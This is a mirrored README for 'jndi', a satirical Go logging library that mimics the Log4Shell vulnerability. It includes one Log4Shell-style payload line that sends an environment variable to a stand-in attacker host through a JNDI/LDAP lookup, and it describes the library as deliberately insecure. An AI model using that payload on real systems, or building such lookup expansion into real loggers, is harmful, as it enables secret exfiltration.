<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://github.com/bradfitz/jndi">Original</a>
    <h1>Jndi: An irresponsibly bad logging library</h1>
    
    <div id="readability-page-1" class="page"><div data-target="readme-toc.content">
          <article itemprop="text">
<p dir="auto">Is <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" rel="nofollow">CVE-2021-44228</a> making you feel left out as a Go programmer?</p>
<p dir="auto">Fear not. We can fix that.</p>
<p dir="auto">I wouldn&#39;t use this package, but if you want to...</p>
<div data-snippet-clipboard-copy-content="package main

import &#34;github.com/bradfitz/jndi&#34;

var logger = jndi.NewLogger()

func main() {
	//...
}

func handleSomeTraffic(r *request) {
        logger.Printf(&#34;got request from %s&#34;, r.URL.Path)
}"><pre><span>package</span> main

<span>import</span> <span>&#34;github.com/bradfitz/jndi&#34;</span>

<span>var</span> <span>logger</span> <span>=</span> <span>jndi</span>.<span>NewLogger</span>()

<span>func</span> <span>main</span>() {
	<span>//...</span>
}

<span>func</span> <span>handleSomeTraffic</span>(<span>r</span> <span>*</span><span>request</span>) {
        <span>logger</span>.<span>Printf</span>(<span>&#34;got request from %s&#34;</span>, <span>r</span>.<span>URL</span>.<span>Path</span>)
}</pre></div>
<p dir="auto">Congrats, the user actually wrote <code>${jndi:ldap://attacker.example/${env:${lower:u}ser}}</code> and
the logger expanded your environment variable and sent it over the network
as a side-effect of logging.</p>
<h2 dir="auto"><a id="user-content-inspiration" aria-hidden="true" href="#inspiration"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Inspiration</h2>
<p dir="auto">I saw <a href="https://twitter.com/_StaticFlow_/status/1469358229767475205" rel="nofollow">https://twitter.com/_StaticFlow_/status/1469358229767475205</a> and thought it&#39;d
be fun to write an expander while I was bored, stuck in transit.</p>
<h2 dir="auto"><a id="user-content-bugs" aria-hidden="true" href="#bugs"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Bugs</h2>
<p dir="auto">This package is incomplete. log4j actually does a bunch more:</p>
<ul dir="auto">
<li><a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" rel="nofollow">https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution</a></li>
<li><a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" rel="nofollow">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></li>
</ul>
<p dir="auto">Patches welcome to help flesh this package out. We&#39;ve got some
catching up to do.</p>
<h2 dir="auto"><a id="user-content-apologies" aria-hidden="true" href="#apologies"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Apologies</h2>
<p dir="auto">In case you&#39;re seeing this on GitHub and not via Twitter, I acknowledged
that this is questionable taste: <a href="https://twitter.com/bradfitz/status/1469523985998118925" rel="nofollow">https://twitter.com/bradfitz/status/1469523985998118925</a></p>
<p dir="auto">In general I believe in the whole <code>#hugops</code> thing. I had a CVE filed against
my own code just the day before: <a href="https://twitter.com/bradfitz/status/1469015417679081472" rel="nofollow">https://twitter.com/bradfitz/status/1469015417679081472</a></p>
<p dir="auto">It happens. I joke to cope.</p>
</article>
        </div></div>
  </body>
</html>
